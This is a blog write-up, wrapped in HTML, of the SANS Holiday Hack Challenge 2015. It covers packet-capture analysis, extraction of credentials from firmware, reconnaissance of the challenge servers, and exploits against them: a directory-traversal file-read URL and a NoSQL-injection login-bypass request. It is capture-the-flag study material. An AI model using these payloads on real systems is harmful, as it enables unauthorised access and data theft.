@@ -1,0 +1,1423 @@
+<!doctype html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8">
+<title>SANS Holiday Challenge 2015 - Writeup - Mike Boya</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png?v=1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png?v=1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png?v=1">
+  <link rel="manifest" href="/favicon/site.webmanifest?v=1">
+  
+    <link rel="mask-icon" href="/favicon/safari-pinned-tab.svg?v=1" color="#ffffff">
+    <link rel="shortcut icon" href="/favicon/favicon.ico?v=1">
+    <meta name="msapplication-config" content="/favicon/browserconfig.xml?v=1">
+  
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="theme-color" content="#ffffff">
+
+<meta name="generator" content="Hugo 0.75.1" /><meta itemprop="name" content="SANS Holiday Challenge 2015 - Writeup">
+<meta itemprop="description" content="Intro
+The SANS Holiday Hack challenge this year was fantastic and I wanted to make sure
+to document my solutions on my blog. I have participated in the Holiday Hack Challenges since 2012, but haven&rsquo;t documented them with the exception of some informal notes &ndash; maybe I should change that! Anyway, enjoy my write-up and I encourage anyone who did not participate to give it a try before reading this post!">
+<meta itemprop="datePublished" content="2016-03-02T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2016-03-02T00:00:00+00:00" />
+<meta itemprop="wordCount" content="5708">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta property="og:title" content="SANS Holiday Challenge 2015 - Writeup" />
+<meta property="og:description" content="Intro
+The SANS Holiday Hack challenge this year was fantastic and I wanted to make sure
+to document my solutions on my blog. I have participated in the Holiday Hack Challenges since 2012, but haven&rsquo;t documented them with the exception of some informal notes &ndash; maybe I should change that! Anyway, enjoy my write-up and I encourage anyone who did not participate to give it a try before reading this post!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mike-boya.github.io/blog/sans-holiday-challenge-2015-writeup/" />
+<meta property="article:published_time" content="2016-03-02T00:00:00+00:00" />
+<meta property="article:modified_time" content="2016-03-02T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SANS Holiday Challenge 2015 - Writeup"/>
+<meta name="twitter:description" content="Intro
+The SANS Holiday Hack challenge this year was fantastic and I wanted to make sure
+to document my solutions on my blog. I have participated in the Holiday Hack Challenges since 2012, but haven&rsquo;t documented them with the exception of some informal notes &ndash; maybe I should change that! Anyway, enjoy my write-up and I encourage anyone who did not participate to give it a try before reading this post!"/>
+<meta name="twitter:site" content="@mikeboya"/>
+<link rel="stylesheet" href="/css/bundle.min.d9e04ae08c9b3049b766dbd4aeab7d862c5ea1d13679b621490e0f5df5507497.css" integrity="sha256-2eBK4IybMEm3ZtvUrqt9hixeodE2ebYhSQ4PXfVQdJc="><link rel="stylesheet" href="/css/add-on.css">
+</head>
+
+  <body>
+    
+
+<header id="site-header">
+  <nav id="site-nav">
+    <h1 class="nav-title">
+      <a href="/" class="nav">
+        
+          Blog
+        
+      </a>
+    </h1>
+    <menu id="site-nav-menu" class="flyout-menu menu">
+      
+        
+          
+          <a href="/" class="nav link"><i class='fa fa-home'></i> Home</a>
+        
+      
+        
+          
+          <a href="/about/" class="nav link"><i class='far fa-id-card'></i> About</a>
+        
+      
+        
+          
+          <a href="/blog/" class="nav link"><i class='far fa-newspaper'></i> Blog</a>
+        
+      
+        
+          
+          <a href="/categories/" class="nav link"><i class='fas fa-sitemap'></i> Categories</a>
+        
+      
+        
+          
+          <a href="/contact/" class="nav link"><i class='far fa-envelope'></i> Contact</a>
+        
+      
+      <a href="#share-menu" class="nav link share-toggle"><i class="fas fa-share-alt">&nbsp;</i>Share</a>
+      <a href="#search-input" class="nav link search-toggle"><i class="fas fa-search">&nbsp;</i>Search</a>
+    </menu>
+    <a href="#search-input" class="nav search-toggle"><i class="fas fa-search fa-2x">&nbsp;</i></a>
+    <a href="#share-menu" class="nav share-toggle"><i class="fas fa-share-alt fa-2x">&nbsp;</i></a>
+    
+    <a href="#site-nav" class="nav nav-toggle"><i class="fas fa-bars fa-2x"></i></a>
+  </nav>
+  <menu id="search" class="menu"><input id="search-input" class="search-input menu"></input><div id="search-results" class="search-results menu"></div></menu>
+  
+  
+    <menu id="share-menu" class="flyout-menu menu">
+      <h1>Share Post</h1>
+      
+
+
+
+
+  
+    
+    <a href="//twitter.com/share?text=SANS%20Holiday%20Challenge%202015%20-%20Writeup&amp;url=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f" target="_blank" rel="noopener" class="nav share-btn twitter">
+        <p>Twitter</p>
+      </a>
+  
+
+  
+      <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f" target="_blank" rel="noopener" class="nav share-btn facebook">
+        <p>Facebook</p>
+        </a>
+  
+
+  
+    <a href="//www.reddit.com/submit?url=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f&amp;title=SANS%20Holiday%20Challenge%202015%20-%20Writeup" target="_blank" rel="noopener" class="nav share-btn reddit">
+          <p>Reddit</p>
+        </a>
+  
+
+  
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f&amp;title=SANS%20Holiday%20Challenge%202015%20-%20Writeup" target="_blank" rel="noopener" class="nav share-btn linkedin">
+            <p>LinkedIn</p>
+          </a>
+  
+
+  
+        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f&amp;description=SANS%20Holiday%20Challenge%202015%20-%20Writeup" target="_blank" rel="noopener" class="nav share-btn pinterest">
+          <p>Pinterest</p>
+        </a>
+  
+
+  
+        <a href="mailto:?subject=Check%20out%20this%20post%20by %7b%20%20%20%20%20%20%20%20map%5b%5d%7d&amp;body=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f" target="_blank" class="nav share-btn email" data-proofer-ignore>
+          <p>Email</p>
+        </a>
+  
+
+
+    </menu>
+  
+</header>
+
+    <div id="wrapper">
+      <section id="site-intro" >
+  <a href="/"><img src="https://mike-boya.github.io/images/logo.jpg" class="circle" width="100" alt="Logo" /></a>
+  <header>
+    <h1>Mike Boya</h1>
+  </header>
+  <main>
+    <p>Infosec Blog</p>
+  </main>
+  
+    <footer>
+      <ul class="socnet-icons">
+        
+        <li><a href="//github.com/mike-boya" target="_blank" rel="noopener" title="GitHub" class="fab fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+<li><a href="//linkedin.com/in/mike-boya-a444a927" target="_blank" rel="noopener" title="LinkedIn" class="fab fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li><a href="//twitter.com/mikeboya" target="_blank" rel="noopener" title="Twitter" class="fab fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    </footer>
+  
+</section>
+
+      <main id="site-main">
+        
+  <article class="post">
+    <header>
+  <div class="title">
+    
+      <h2><a href="/blog/sans-holiday-challenge-2015-writeup/">SANS Holiday Challenge 2015 - Writeup</a></h2>
+    
+    
+  </div>
+  <div class="meta">
+    <time datetime="2016-03-02 00:00:00 &#43;0000 UTC">March 2, 2016</time>
+    
+    <p>27-Minute Read</p>
+  </div>
+</header>
+
+    <div id="socnet-share">
+      
+
+
+
+
+  
+    
+    <a href="//twitter.com/share?text=SANS%20Holiday%20Challenge%202015%20-%20Writeup&amp;url=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f" target="_blank" rel="noopener" class="nav share-btn twitter">
+        <p>Twitter</p>
+      </a>
+  
+
+  
+      <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f" target="_blank" rel="noopener" class="nav share-btn facebook">
+        <p>Facebook</p>
+        </a>
+  
+
+  
+    <a href="//www.reddit.com/submit?url=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f&amp;title=SANS%20Holiday%20Challenge%202015%20-%20Writeup" target="_blank" rel="noopener" class="nav share-btn reddit">
+          <p>Reddit</p>
+        </a>
+  
+
+  
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f&amp;title=SANS%20Holiday%20Challenge%202015%20-%20Writeup" target="_blank" rel="noopener" class="nav share-btn linkedin">
+            <p>LinkedIn</p>
+          </a>
+  
+
+  
+        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f&amp;description=SANS%20Holiday%20Challenge%202015%20-%20Writeup" target="_blank" rel="noopener" class="nav share-btn pinterest">
+          <p>Pinterest</p>
+        </a>
+  
+
+  
+        <a href="mailto:?subject=Check%20out%20this%20post%20by %7b%20%20%20%20%20%20%20%20map%5b%5d%7d&amp;body=https%3a%2f%2fmike-boya.github.io%2fblog%2fsans-holiday-challenge-2015-writeup%2f" target="_blank" class="nav share-btn email" data-proofer-ignore>
+          <p>Email</p>
+        </a>
+  
+
+
+    </div>
+    <div class="content">
+      
+      <h2 id="intro">Intro</h2>
+<p>The SANS Holiday Hack challenge this year was fantastic and I wanted to make sure
+to document my solutions on my blog. I have participated in the Holiday Hack Challenges since 2012, but haven&rsquo;t documented them with the exception of some informal notes &ndash; maybe I should change that! Anyway, enjoy my write-up and I encourage anyone who did not participate to give it a try before reading this post!</p>
+<p>One other note: I <strong>finally</strong> finished writing this up. It&rsquo;s about a month later than
+I expected, but life is busy.</p>
+<h2 id="part-0-dosis-neighborhood">Part 0: Dosis Neighborhood</h2>
+<img src="/images/sans_2015/hhq-menu.png"/>
+<p>The first step I took was to explore the Dosis neighborhood aka Holiday Hack
+Quest and complete all 21 achievements. As Johnny Drama would say, &ldquo;VICTORY!&rdquo;</p>
+<img src="/images/sans_2015/victory.png"/>
+<p>This game was extremely fun and incredibly detailed, I was even able to drop by
+NetWars and say hello to <a href="https://twitter.com/jeffmcjunkin">Jeff McJunkin</a>!</p>
+<img src="/images/sans_2015/netwars.png"/>
+<p>This was a pretty cool component to the challenge, offering mazes, riddles,
+and some hints for the analysis. As a huge Zelda fan, I admit that I was already
+very impressed even before beginning any actual hacking. My write-up is focused on the technical portions of the challenge and does not include a detailed walk-through
+of the game.</p>
+<h2 id="part-1-curious-wireless-packets">Part 1: Curious Wireless Packets</h2>
+<p>Josh Dosis informed us that &ldquo;That gnome is not what he seemed!&rdquo; and has captured
+some WiFi traffic from the network the gnome was on. He provided us with that
+capture and this is where the real fun starts.</p>
+<p>I completed this part of the challenge before the <em>scapy</em> helper scripts were provided, so I just used some command-line fu:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@foo:~$ tcpdump -nnAr giyh-capture.pcap <span style="color:#e6db74">&#39;src 52.2.229.189&#39;</span> | grep <span style="color:#e6db74">&#39; TXT &#39;</span> | awk <span style="color:#e6db74">&#39;{print $15}&#39;</span> | cut -d<span style="color:#e6db74">&#39;&#34;&#39;</span> -f2 &gt; foo.txt
+reading from file giyh-capture.pcap, link-type IEEE802_11_RADIO <span style="color:#f92672">(</span>802.11 plus radiotap header<span style="color:#f92672">)</span>
+tcpdump: pcap_loop: truncated dump file; tried to read <span style="color:#ae81ff">117</span> captured bytes, only got <span style="color:#ae81ff">43</span>
+mike@foo:~$ <span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>cat foo.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> echo $i | base64 --decode | grep -v <span style="color:#e6db74">&#34;NONE:&#34;</span> &gt;&gt; bar.txt; <span style="color:#66d9ef">done</span></code></pre></div>
+<p>A few notes on this:</p>
+<ul>
+<li> I only grabbed packets with the SuperGnome as the source. The packets with the Gnome as the source will just contain the output from the commands.</li>
+<li> I removed the double-quotes and base64 decoded the lines.</li>
+<li> Using <code>grep -v</code>, I removed the lines containing "NONE:" as those indicate no operation.</li>
+</ul>
+The output was:
+<pre><code>    EXEC:iwconfig
+    EXEC:cat /tmp/iwlistscan.txt
+    FILE:/root/Pictures/snapshot_CURRENT.jpg
+</code></pre>
+<p>This answers question #1 and alludes to the answer for #2:</p>
+<p><strong>1) Which commands are sent across the Gnome’s command-and-control channel?</strong></p>
+<p>The two commands sent across the C2 channel were:</p>
+<ul>
+<li> iwconfig</li>
+<li> cat /tmp/iwlistscan.txt</li>
+</ul>
+Modifying my one-liners allowed me to grab the image sent across the channel.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mike@foo:~$ tcpdump -nnAr giyh-capture.pcap <span style="color:#e6db74">&#39;src 10.42.0.18&#39;</span> | grep <span style="color:#e6db74">&#39; TXT &#39;</span> | awk <span style="color:#e6db74">&#39;{print $20}&#39;</span> | cut -d<span style="color:#e6db74">&#39;&#34;&#39;</span> -f2 &gt; foo.txt
+mike@foo:~$ <span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>cat foo.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> echo $i | base64 --decode &gt;&gt; bar.txt; <span style="color:#66d9ef">done</span>
+mike@foo:~$ vim bar.txt
+mike@foo:~$ sed -i <span style="color:#e6db74">&#34;s/FILE://g&#34;</span> bar.txt
+mike@foo:~$ mv bar.txt bar.jpg</code></pre></div>
+<p>Notes:</p>
+<ul>
+<li> I changed the source from the SuperGnome (52.2.229.189) to the Gnome (10.42.0.18) in order to grab the file sent.</li>
+<li> I manually altered the original decoded data, in *vim*, and removed everything until the "FILE:" calls.</li>
+<li> Using <code>sed -i</code>, I removed the "FILE:" calls from the file.</li>
+<li> Finally, I changed the extension from txt to jpg and verified my result.</li>
+</ul>
+The result answers question \#2:
+<p><strong>2) What image appears in the photo the Gnome sent across the channel from the Dosis home?</strong></p>
+<img src="/images/sans_2015/dosis-room.jpg"/>
+<h2 id="part-2-firmware-analysis-for-fun-and-profit">Part 2: Firmware Analysis for Fun and Profit</h2>
+<p>I navigated over to Josh Dosis in the Dosis neighborhood and provided him with
+watermark from the image sent over the channel.</p>
+<img src="/images/sans_2015/josh-goodwork.png"/>
+<p>He directed me to Jess Dosis, who provided me with a firmware image and the following instructions:</p>
+<p>&ldquo;I took the liberty of disassembling the Gnome and dumped the NAND storage using my
+Xeltek SuperPro 6100 to a file. Can you extract a password from <strong>this data dump</strong>?&rdquo;</p>
+<p>Now I play with packet captures all day, but firmware analysis?! I decided to do
+some additional research and see if I could learn some new skills.</p>
+<p>{% codeblock lang:bash %}
+mike@foo:~/sans-holiday-hack-2015$ ls
+giyh-firmware-dump.bin
+{% endcodeblock %}</p>
+<p>Using <em>binwalk</em>, I extracted the files filed found in the firmware using the <code>-e</code> option.</p>
+<pre><code>    mike@foo:~/sans-holiday-hack-2015$ binwalk -e giyh-firmware-dump.bin
+
+    DECIMAL       HEX           DESCRIPTION
+    -------------------------------------------------------------------------------------------------------
+    0             0x0           PEM certificate
+    1809          0x711         ELF 32-bit LSB shared object, ARM, version 1 (SYSV)
+    168803        0x29363       Squashfs filesystem, little endian, version 4.0, compression: gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 13:47:32 2015
+    mike@foo:~/sans-holiday-hack-2015$ ls
+    29363.squashfs  giyh-firmware-dump.bin
+</code></pre>
+<p>Interesting &ndash; a squashfs fileystsem, used mainly in tiny-sized and embedded Linux systems, which sounds like the gnomes. I installed squashfs-tools and used the tool <em>unsquashfs</em> to extract the data.</p>
+<pre><code>    mike@foo:~/sans-holiday-hack-2015$ unsquashfs 29363.squashfs
+    Parallel unsquashfs: Using 2 processors
+    3936 inodes (5763 blocks) to write
+
+    [========================================================================================================================================================================================================================-] 5763/5763 100%
+    created 3899 files
+    created 930 directories
+    created 37 symlinks
+    created 0 devices
+    created 0 fifos
+    mike@foo:~/sans-holiday-hack-2015/squashfs-root$ ls
+    bin  etc  init  lib  mnt  opt  overlay  rom  root  sbin  tmp  usr  var  www
+</code></pre>
+<p>Great! We can simply look around now. Let&rsquo;s run some quick commands to answer the
+questions:</p>
+<pre><code>    mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat etc/banner
+       _______                     ________        __
+      |       |.-----.-----.-----.|  |  |  |.----.|  |_
+      |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+      |_______||   __|_____|__|__||________||__|  |____|
+                |__| W I R E L E S S   F R E E D O M
+     -----------------------------------------------------
+            DESIGNATED DRIVER (Bleeding Edge, r47650)
+ -----------------------------------------------------
+      * 2 oz. Orange Juice         Combine all juices in a
+      * 2 oz. Pineapple Juice      tall glass filled with
+      * 2 oz. Grapefruit Juice     ice, stir well.
+      * 2 oz. Cranberry Juice
+     -----------------------------------------------------
+    mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat etc/openwrt_release
+    DISTRIB_ID=**'OpenWrt'**
+    DISTRIB_RELEASE='Bleeding Edge'
+    DISTRIB_REVISION='r47650'
+    DISTRIB_CODENAME='designated_driver'
+    DISTRIB_TARGET='realview/generic'
+    DISTRIB_DESCRIPTION='OpenWrt Designated Driver r47650'
+    DISTRIB_TAINTS=''
+
+    mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat www/app.js | head -n 15
+    **var express = require('express');**
+    var path = require('path');
+    var favicon = require('serve-favicon');
+    var logger = require('morgan');
+    var cookieParser = require('cookie-parser');
+    var bodyParser = require('body-parser');
+    var routes = require('./routes/index');
+    **var mongo = require('mongodb');**
+    var monk = require('monk');
+    **var db = monk('gnome:KTt9C1SljNKDiobKKro926frc@localhost:27017/gnome')**
+
+    **var app = express();**
+    // view engine setup
+    app.set('views', path.join(\__dirname, 'views'));
+    app.set('view engine', 'jade');
+</code></pre>
+<p>To fully answer the second question, we need to collect some more information on the mongodb.</p>
+<pre><code>    mike@foo:~/sans-holiday-hack-2015/squashfs-root$ cat etc/mongod.conf
+    # LOUISE: No logging, YAY for /dev/null
+    # AUGGIE: Louise, stop being so excited to basic Unix functionality
+    # LOUISE: Auggie, stop trying to ruin my excitement!
+
+    systemLog:
+      destination: file
+      path: /dev/null
+      logAppend: true
+    storage:
+      **dbPath: /opt/mongodb**
+    net:
+      bindIp: 127.0.0.1
+
+    mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt$ mongodump --dbpath ../opt/mongodb/
+    mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt$ ls
+    dump  **mongodb**
+    mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt$ cd dump/gnome/
+    mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt/dump/gnome$ ls
+    cameras.bson  cameras.metadata.json  settings.bson  settings.metadata.json  status.bson  status.metadata.json  system.indexes.bson  **users.bson** users.metadata.json
+    mike@foo:~/sans-holiday-hack-2015/squashfs-root/opt/dump/gnome$ bsondump users.bson
+    { &quot;\_id&quot; : ObjectId( &quot;56229f58809473d11033515b&quot; ), &quot;username&quot; : **&quot;user&quot;**, &quot;password&quot; : **&quot;user&quot;**, &quot;user_level&quot; : 10 }
+    { &quot;\_id&quot; : ObjectId( &quot;56229f63809473d11033515c&quot; ), &quot;username&quot; : **&quot;admin&quot;**, &quot;password&quot; : **&quot;SittingOnAShelf&quot;**, &quot;user_level&quot; : 100 }
+    2 objects found
+</code></pre>
+<img src="/images/sans_2015/jess-dosis.png"/>
+<p>Jess confirmed! That confirms the answers to the questions.</p>
+<p><strong>3) What operating system and CPU type are used in the Gnome? What type of web framework is the Gnome web interface built in?</strong></p>
+<p>Operating System: OpenWRT
+CPU type: ARM</p>
+<p>The Gnome web interface is built in NodeJS(Express).</p>
+<p><strong>4) What kind of a database engine is used to support the Gnome web interface? What is the plaintext password stored in the Gnome database?</strong></p>
+<p>The database engine used to support the Gnome web interface is MongoDB. There are two plaintext passwords stored in the Gnome database - &lsquo;user&rsquo; and &lsquo;SittingOnAShelf&rsquo;.</p>
+<h2 id="part-3-internet-wide-scavenger-hunt">Part 3: Internet-Wide Scavenger Hunt</h2>
+<p>As we move into Part 3 the Dosis, children come to the shocking conclusion that the SuperGnomes must be scattered across the globe!</p>
+<p>SANS also provided a great hint for this one:</p>
+<pre><code>   &quot;If you need inspiration for constructing your search, visit the Dosis Neighborhood and **sho Dan** your plan.&quot;
+</code></pre>
+<p>This was how I located the SuperGnomes:</p>
+<ol>
+<li>I located SG-01 (52.2.229.189) by identifying the IP that was communicating with the Gnome from the packet capture from Part 1</li>
+<li>I used the title <code>GIYH::ADMIN PORT V.01</code> to <em>google dork</em> for additional SuperGnomes, which is how I located SG-02 (52.34.3.80)</li>
+<li>Next, I used the hint and searched <em>Shodan</em> for SG-02&rsquo;s IP and then for the unique field: <code>X-Powered-By: GIYH::SuperGnome</code>, which presented me with all five SuperGnome IP&rsquo;s and locations</li>
+</ol>
+<img src="/images/sans_2015/xpower.png"/>
+<img src="/images/sans_2015/shodan.png"/>
+<p>Finally, I located Tom Hessman in the Dosis neighborhood and verified all five Super Gnome IPs.</p>
+<img src="/images/sans_2015/tom-verify.png"/>
+<p><strong>5) What are the IP addresses of the five SuperGnomes scattered around the world, as verified by Tom Hessman in the Dosis neighborhood?</strong></p>
+<pre><code>    SG-01 = 52.2.229.189
+    SG-02 = 52.34.3.80
+    SG-03 = 52.64.191.71
+    SG-04 = 52.192.152.132
+    SG-05 = 54.233.105.81
+</code></pre>
+<p>Even though Shodan provided me with the city and country I wanted to double-check them with ipinfo:</p>
+<pre><code>    mike@foo:~$ for ip in 52.2.229.189 52.34.3.80 52.64.191.71 52.192.152.132 54.233.105.81; do curl -s ipinfo.io/$ip | egrep 'ip|city|country'; done
+      &quot;ip&quot;: &quot;52.2.229.189&quot;,
+      &quot;city&quot;: &quot;Ashburn&quot;,
+      &quot;country&quot;: &quot;US&quot;,
+      &quot;ip&quot;: &quot;52.34.3.80&quot;,
+      &quot;city&quot;: &quot;Boardman&quot;,
+      &quot;country&quot;: &quot;US&quot;,
+      &quot;ip&quot;: &quot;52.64.191.71&quot;,
+      &quot;city&quot;: &quot;Sydney&quot;,
+      &quot;country&quot;: &quot;AU&quot;,
+      &quot;ip&quot;: &quot;52.192.152.132&quot;,
+      &quot;city&quot;: &quot;Tokyo&quot;,
+      &quot;country&quot;: &quot;JP&quot;,
+      &quot;ip&quot;: &quot;54.233.105.81&quot;,
+      &quot;city&quot;: &quot;São Paulo&quot;,
+      &quot;country&quot;: &quot;BR&quot;,
+</code></pre>
+<p><strong>6) Where is each SuperGnome located geographically?</strong></p>
+<pre><code>    SG-01 = United States, Ashburn
+    SG-02 = United States, Boardman
+    SG-03 = Australia, Sydney
+    SG-04 = Japan, Tokyo
+    SG-05 = Brazil, São Paulo
+</code></pre>
+<h2 id="part-4-gnomage-pwnage">Part 4: Gnomage Pwnage</h2>
+<p>I did a quick <em>nmap</em> scan on each of the SuperGnomes and discovered that they each
+have a webserver on port 80.</p>
+<p><strong>7) Please describe the vulnerabilities you discovered in the Gnome firmware.</strong></p>
+<p><strong>8) ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN IN THE DOSIS NEIGHBORHOOD, attempt to remotely exploit each of the SuperGnomes.  Describe the technique you used to gain access to each SuperGnome’s gnome.conf file.  YOU ARE AUTHORIZED TO ATTACK ONLY THE IP ADDRESSES THAT TOM HESSMAN IN THE DOSIS NEIGHBORHOOD EXPLICITLY ACKNOWLEDGES AS “IN SCOPE.”  ATTACK NO OTHER SYSTEMS ASSOCIATED WITH THE HOLIDAY HACK CHALLENGE.</strong></p>
+<p>I will answer these questions below by describing my methodology to attack the SuperGnomes.</p>
+<h3 id="sg-01">SG-01</h3>
+<p>SG-01 was accessed by logging into the SuperGnome web interface on 52.2.229.189
+using the admin credentials <code>admin:SittingOnAShelf</code> found in the
+mongo database in the gnome firmware. After logging in, I explored the available
+features and was able to download each of the files, including gnome.conf:</p>
+<pre><code>    Gnome Serial Number: **NCC1701**
+    Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
+    Allow new subordinates?: YES
+    Camera monitoring?: YES
+    Audio monitoring?: YES
+    Camera update rate: 60min
+    Gnome mode: SuperGnome
+    Gnome name: SG-01
+    Allow file uploads?: YES
+    Allowed file formats: .png
+    Allowed file size: 512kb
+    Files directory: /gnome/www/files/
+</code></pre>
+<p>Vulnerability: Password Re-use<br />
+Gnome Serial Number: <strong>NCC1701</strong> = [https://en.wikipedia.org/wiki/USS_Enterprise_(NCC-1701)]</p>
+<h3 id="sg-02">SG-02</h3>
+<p>I logged into SuperGnome-02 (52.34.3.80) with the same credentials, but when I tried
+to download the files was presented with an error specifying &ldquo;Downloading disabled
+by Super-Gnome administrator.&rdquo;</p>
+<p>I quickly identified a section in <code>/settings</code> that was not available on SG-01 containing an upload function. This could be the attack vector we need, let&rsquo;s consult the firmware to identify any vulnerabilities:</p>
+<p>{% codeblock index.js %}     <br>
+// CAMERA VIEWER
+// STUART: Note: to limit disclosure issues, this code checks to make sure the user asked for a .png file
+router.get('/cam', function(req, res, next) {
+var camera = unescape(req.query.camera);
+// check for .png
+//if (camera.indexOf('.png') == -1) // STUART: Removing this&hellip;I think this is a better solution&hellip; right?
+camera = camera + &lsquo;.png&rsquo;; // add .png if its not found
+console.log(&ldquo;Cam:&rdquo; + camera);
+fs.access('./public/images/' + camera, fs.F_OK | fs.R_OK, function(e) {
+if (e) {
+res.end(&lsquo;File ./public/images/&rsquo; + camera + ' does not exist or access denied!');
+}
+});
+fs.readFile('./public/images/' + camera, function (e, data) {
+res.end(data);
+});
+});
+{% endcodeblock %}</p>
+<p>The code above was located in <code>/www/routes/index.js</code>. It appears that .png anywhere in the filename will satisfy the check.</p>
+<p>I successfully uploaded a directory named &ldquo;foo.png/&rdquo;.</p>
+<pre><code>    Dir /gnome/www/public/upload/UdmXdYtu/foo.png/ created successfully!
+    Insufficient space! File creation error!
+</code></pre>
+<p>Then, I leveraged the LFI (local file inclusion) vulnerability to grab the gnome.conf.</p>
+<pre><code>    http://52.34.3.80/cam?camera=../upload/UdmXdYtu/foo.png/../../../../../www/files/gnome.conf
+</code></pre>
+<p>SG-02 gnome.conf:</p>
+<pre><code>    Gnome Serial Number: **XKCD988**
+    Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
+    Allow new subordinates?: YES
+    Camera monitoring?: YES
+    Audio monitoring?: YES
+    Camera update rate: 60min
+    Gnome mode: SuperGnome
+    Gnome name: SG-02
+    Allow file uploads?: YES
+    Allowed file formats: .png
+    Allowed file size: 512kb
+    Files directory: /gnome/www/files/
+</code></pre>
+<p>Vulnerability: LFI and Directory Traversal<br />
+Gnome Serial Number: <strong>XKCD988</strong> = [https://xkcd.com/988/]</p>
+<h3 id="sg-03">SG-03</h3>
+<p>SuperGnome-03 really stumped me for awhile. I tried logging into the web portal
+with the same admin credentials but was denied. The user account did work, but
+did not have sufficient permissions. After talking to some of the individuals in
+Dosis neighborhood, I learned about NoSQL injection. Looking at the LOGIN POST section of the firmware confirmed my suspicions. I include that code below for reference, it was located in the <code>/www/routes/index.js</code> file.</p>
+<p>{% codeblock index.js %}
+// LOGIN POST
+router.post('/', function(req, res, next) {
+var db = req.db;
+var msgs = [];
+db.get(&lsquo;users&rsquo;).findOne({username: req.body.username, password: req.body.password}, function (err, user) { // STUART: Removed this in favor of below.  Really guys?
+//db.get(&lsquo;users&rsquo;).findOne({username: (req.body.username || &ldquo;&quot;).toString(10), password: (req.body.password || &ldquo;&quot;).toString(10)}, function (err, user) { // LOUISE: allow passwords longer than 10 chars
+if (err || !user) {
+console.log(&lsquo;Invalid username and password: ' + req.body.username + &lsquo;/&rsquo; + req.body.password);
+msgs.push(&lsquo;Invalid username or password!');
+res.msgs = msgs;
+title = &ldquo;sans holiday challenge 2015 writeup&rdquo;
+} else {
+sessionid = gen_session();
+sessions[sessionid] = { username: user.username, logged_in: true, user_level: user.user_level };
+console.log(&ldquo;User level:&rdquo; + user.user_level);
+res.cookie(&lsquo;sessionid&rsquo;, sessionid);
+res.writeHead(301,{ Location: &lsquo;/&rsquo; });
+res.end();
+}
+});
+});
+{% endcodeblock %}</p>
+<p>The part that tripped me up was forging the Content-Type to &ldquo;application/json&rdquo;
+in order to use the <code>$ne</code> operator. Note: You can also use <code>$gt</code> here.</p>
+<p>I constructed a POST in <em>Burp</em> in order to bypass the login:</p>
+<pre><code>    POST / HTTP/1.1
+    Host: 52.64.191.71
+    User-Agent: merry xmas you filthy animal
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  ￼
+    Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate
+    Referer: http://52.64.191.71/
+    Cookie: sessionid=duTDpykscaXdKJeH3ioC Connection: close
+    Content-Type: application/json Content-Length: 68
+    {
+    &quot;username&quot;: {&quot;$eq&quot;: &quot;admin&quot;},
+    &quot;password&quot;: {&quot;$ne&quot;: &quot;&quot;}
+    }
+</code></pre>
+<p>After forwarding that post, I received:</p>
+<pre><code>    SuperGnome 03
+    Welcome admin, to the GIYH Administrative Portal.
+</code></pre>
+<p>Success! After logging in the web portal is similar to SG-01 and allows us to download the files we need.</p>
